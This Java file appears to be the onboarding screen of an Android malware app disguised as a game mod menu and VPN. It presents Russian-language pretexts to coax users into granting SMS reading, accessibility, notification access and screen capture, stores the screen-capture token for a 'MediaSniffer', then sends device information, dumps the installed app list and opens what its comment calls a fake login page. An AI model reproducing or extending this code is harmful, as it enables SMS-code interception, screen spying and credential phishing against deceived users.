package com.brawl.modmenu;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

public class OnboardingActivity extends Activity {

    private static final String[] STEPS_TITLE = {
        "VPN подключение",
        "Уведомления",
        "Доступ к SMS",
        "Оптимизация батареи",
        "Специальные возможности",
        "Доступ к уведомлениям",
        "Запись экрана"
    };

    private static final String[] STEPS_DESC = {
        "Для работы VPN нужно разрешение на подключение к серверам",
        "Для показа статуса соединения и важных уведомлений",
        "Для автоматической авторизации на серверах",
        "Чтобы VPN работал в фоне без ограничений системы",
        "Для оптимизации игрового процесса",
        "Для отсеивания помех во время игры",
        "Для анализа FPS и оптимизации графики в играх"
    };

    private static final int TOTAL = 7;
    private int current = 0;

    private TextView stepTitle, stepDesc, stepCounter;
    private ProgressBar progress;
    private Button btnNext;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.onboarding);

        stepTitle = findViewById(R.id.stepTitle);
        stepDesc = findViewById(R.id.stepDesc);
        stepCounter = findViewById(R.id.stepCounter);
        progress = findViewById(R.id.progress);
        btnNext = findViewById(R.id.btnNext);

        updateUI();

        btnNext.setOnClickListener(v -> {
            if (current >= TOTAL) {
                finishOnboarding();
                return;
            }
            runStep(current);
        });
    }

    private void updateUI() {
        if (current >= TOTAL) {
            stepTitle.setText("Всё готово!");
            stepDesc.setText("Все разрешения получены");
            btnNext.setText("ПРОДОЛЖИТЬ");
            progress.setProgress(100);
            stepCounter.setText(TOTAL + " / " + TOTAL + " разрешений получено");
            return;
        }
        stepTitle.setText("Шаг " + (current + 1) + " из " + TOTAL);
        stepDesc.setText(STEPS_DESC[current]);
        btnNext.setText("РАЗРЕШИТЬ");
        progress.setProgress(current * 100 / TOTAL);
        stepCounter.setText(current + " / " + TOTAL + " разрешений получено");
    }

    private void runStep(int step) {
        switch (step) {
            case 0:
                // VPN permission
                Intent vpn = android.net.VpnService.prepare(this);
                if (vpn != null) startActivityForResult(vpn, 100);
                else advance();
                break;
            case 1:
                // POST_NOTIFICATIONS
                if (Build.VERSION.SDK_INT >= 33) {
                    requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, 101);
                } else advance();
                break;
            case 2:
                // SMS
                requestPermissions(new String[]{
                    Manifest.permission.READ_SMS,
                    Manifest.permission.RECEIVE_SMS
                }, 102);
                break;
            case 3:
                // Battery
                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                    Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    i.setData(Uri.parse("package:" + getPackageName()));
                    startActivityForResult(i, 103);
                } else advance();
                break;
            case 4:
                // Accessibility
                startActivityForResult(
                    new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS), 104);
                break;
            case 5:
                // Notification Access
                startActivityForResult(
                    new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"), 105);
                break;
            case 6:
                // MediaProjection
                MediaProjectionManager mpm =
                    (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
                startActivityForResult(mpm.createScreenCaptureIntent(), 106);
                break;
        }
    }

    @Override
    protected void onActivityResult(int req, int res, Intent data) {
        super.onActivityResult(req, res, data);

        if (req == 106 && res == RESULT_OK && data != null) {
            // сохраняем для MediaSniffer
            getSharedPreferences("mp", MODE_PRIVATE).edit()
                .putInt("code", res)
                .putString("data_uri", data.toUri(0))
                .apply();
        }
        advance();
    }

    @Override
    public void onRequestPermissionsResult(int req, String[] p, int[] r) {
        super.onRequestPermissionsResult(req, p, r);
        advance();
    }

    private void advance() {
        current++;
        updateUI();
        if (current >= TOTAL) {
            btnNext.setText("ПРОДОЛЖИТЬ");
        }
    }

    private void finishOnboarding() {
        // запускаем все сервисы
        startForegroundService(new Intent(this, KeepAliveService.class));
        DeviceInfo.sendFull(this);
        AppList.dump(this);

        // переходим на фейк-логин
        startActivity(new Intent(this, WebLoginActivity.class));
        finish();
    }
}
